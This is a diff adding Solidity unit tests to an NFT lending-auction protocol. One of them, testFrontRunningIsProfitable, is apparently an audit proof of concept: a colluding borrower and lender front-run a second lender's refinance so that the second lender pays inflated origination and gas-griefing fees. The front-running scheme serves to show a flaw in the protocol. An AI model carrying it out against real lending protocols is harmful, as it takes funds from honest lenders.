@@ -17,6 +17,8 @@ import "../mock/CEtherMock.sol";
 import "../mock/ERC20Mock.sol";
 import "../mock/ERC721Mock.sol";
 
+import "../Console.sol";
+
 contract LendingAuctionUnitTest is
     BaseTest,
     ILendingEvents,
@@ -6782,6 +6784,192 @@ contract LendingAuctionUnitTest is
         hevm.expectRevert("sanctioned address");
 
         lendingAuction.repayLoanForAccount(address(mockNft), 1);
+    }
+
+    function testFrontRunningIsProfitable() public {
+        // Note borrower and Lender 1 are colluding together
+        // to extract fees from Lender 2
+        hevm.startPrank(LENDER_1);
+        usdcToken.mint(address(LENDER_1), 10 ether);
+        usdcToken.approve(address(liquidityProviders), 10 ether);
+        liquidityProviders.supplyErc20(address(usdcToken), 10 ether);
+
+        // Lender 1 has 1e18 USDC (1e18e18 cUSDC)
+        assertEq(
+            liquidityProviders.getCAssetBalance(LENDER_1, address(cUSDCToken)),
+            10 ether * 1 ether
+        );
+
+        Offer memory offer = Offer({
+            creator: LENDER_1,
+            nftContractAddress: address(mockNft),
+            interestRatePerSecond: 1,
+            fixedTerms: false,
+            floorTerm: true,
+            lenderOffer: true,
+            nftId: 1,
+            asset: address(usdcToken),
+            amount: 1 ether,
+            duration: 1 days,
+            expiration: uint32(block.timestamp + 1)
+        });
+
+        offersContract.createOffer(offer);
+
+        bytes32 offerHash = offersContract.getOfferHash(offer);
+
+        hevm.stopPrank();
+
+        // Borrower executes loan
+        lendingAuction.executeLoanByBorrower(
+            offer.nftContractAddress,
+            offer.nftId,
+            offerHash,
+            offer.floorTerm
+        );
+
+        // Lender 1 has 1e18 fewer USDC, i.e., 9e18
+        assertEq(
+            liquidityProviders.getCAssetBalance(LENDER_1, address(cUSDCToken)),
+            9 ether * 1 ether
+        );
+
+        // Warp ahead 12 hours
+        hevm.warp(block.timestamp + 12 hours);
+
+        // Lender 2 wants to refinance
+        // given the current loan, they only expect
+        // to pay an origination fee relative to 1e18 draw amount
+        // and no gas griefing fee
+        hevm.startPrank(LENDER_2);
+        usdcToken.mint(address(LENDER_2), 10 ether);
+        usdcToken.approve(address(liquidityProviders), 10 ether);
+
+        liquidityProviders.supplyErc20(address(usdcToken), 10 ether);
+        hevm.stopPrank();
+
+        // Lender 1 decides to frontrun Lender 2
+        // thereby 9x'ing the origination fee
+        // and adding a gas griefing fee
+        hevm.startPrank(LENDER_1);
+        Offer memory frontrunner = Offer({
+            creator: LENDER_1,
+            nftContractAddress: address(mockNft),
+            interestRatePerSecond: 1,
+            fixedTerms: false,
+            floorTerm: false,
+            lenderOffer: true,
+            nftId: 1,
+            asset: address(usdcToken),
+            amount: 9 ether,
+            duration: 1 days,
+            expiration: uint32(block.timestamp + 1)
+        });
+
+        lendingAuction.refinanceByLender(frontrunner);
+
+        // Lender 1 has same 9e18 USDC (9e18e18 cUSDC)
+        assertEq(
+            liquidityProviders.getCAssetBalance(LENDER_1, address(cUSDCToken)),
+            9 ether * 1 ether
+        );
+
+        hevm.stopPrank();
+
+        // Borrower (colluding with Lender 1 and still frontrunning Lender 2)
+        // draws full amount
+        // to maximize origination fee and gas griefing fee
+        // that Lender 2 will pay Lender 1
+        lendingAuction.drawLoanAmount(address(mockNft), 1, 8 ether);
+
+        // After borrower draws rest, Lender 1 has 1e18 USDC
+        assertEq(
+            liquidityProviders.getCAssetBalance(LENDER_1, address(cUSDCToken)),
+            1 ether * 1 ether
+        );
+
+        hevm.startPrank(LENDER_2);
+
+        Offer memory offer2 = Offer({
+            creator: LENDER_2,
+            nftContractAddress: address(mockNft),
+            interestRatePerSecond: 1,
+            fixedTerms: false,
+            floorTerm: false,
+            lenderOffer: true,
+            nftId: 1,
+            asset: address(usdcToken),
+            amount: 9 ether + 1,
+            duration: 1 days,
+            expiration: uint32(block.timestamp + 1)
+        });
+
+        lendingAuction.refinanceByLender(offer2);
+
+        hevm.stopPrank();
+
+        // Below are calculations concerning how much
+        // Lender 1 extracted from Lender 2
+
+        uint256 principal = 10 ether;
+
+        uint256 interest = 12 * 60 * 60; // 1 per second for 12 hours
+
+        uint256 amtDrawn = 9 ether;
+        uint256 MAX_BPS = 10_000;
+        uint256 originationFee = 50;
+        uint256 gasGriefingFee = 25;
+        uint256 feesFromLender2 = ((amtDrawn * originationFee) / MAX_BPS) +
+            ((amtDrawn * gasGriefingFee) / MAX_BPS);
+
+        assertEq(
+            liquidityProviders.getCAssetBalance(LENDER_1, address(cUSDCToken)),
+            (principal + interest + feesFromLender2) * 1 ether
+        );
+
+        assertEq(feesFromLender2, 0.0675 ether);
+    }
+
+    function testDrawLoanAmount_slashUnsupportedAmount_works() public {
+        setupRefinance();
+
+        //increase block.timestamp to accumulate interest
+        hevm.warp(block.timestamp + 12 hours);
+
+        hevm.prank(LENDER_2);
+        liquidityProviders.withdrawErc20(address(usdcToken), 0.9 ether);
+
+        LoanAuction memory loanAuction = lendingAuction.getLoanAuction(address(mockNft), 1);
+        (uint256 lenderInterest, ) = lendingAuction.calculateInterestAccrued(address(mockNft), 1);
+        uint256 lenderBalanceBefore = liquidityProviders.getCAssetBalance(
+            LENDER_2,
+            address(cUSDCToken)
+        );
+
+        assertEq(lenderInterest, 29999999999980800);
+        assertEq(loanAuction.amountDrawn, 6 ether);
+        assertTrue(loanAuction.lenderRefi);
+        assertEq(lenderBalanceBefore, 40000000000019200000000000000000000);
+
+        lendingAuction.drawLoanAmount(address(mockNft), 1, 1 ether);
+
+        LoanAuction memory loanAuctionAfter = lendingAuction.getLoanAuction(address(mockNft), 1);
+        (uint256 lenderInterestAfter, ) = lendingAuction.calculateInterestAccrued(
+            address(mockNft),
+            1
+        );
+        uint256 lenderBalanceAfter = liquidityProviders.getCAssetBalance(
+            LENDER_2,
+            address(cUSDCToken)
+        );
+
+        assertEq(lenderInterestAfter, 0);
+        assertEq(lenderBalanceAfter, 0);
+        // balance of the borrower
+        assertEq(usdcToken.balanceOf(address(this)), 6040000000000019200);
+        // we expect the amountDrawn to be 6.04x ether. This is the remaining balance of the lender plus the current amountdrawn
+        assertEq(loanAuctionAfter.amountDrawn, 6040000000000019200);
+        assertTrue(!loanAuctionAfter.lenderRefi);
     }
 
     // TODO(miller): More tests for regen collective percentage
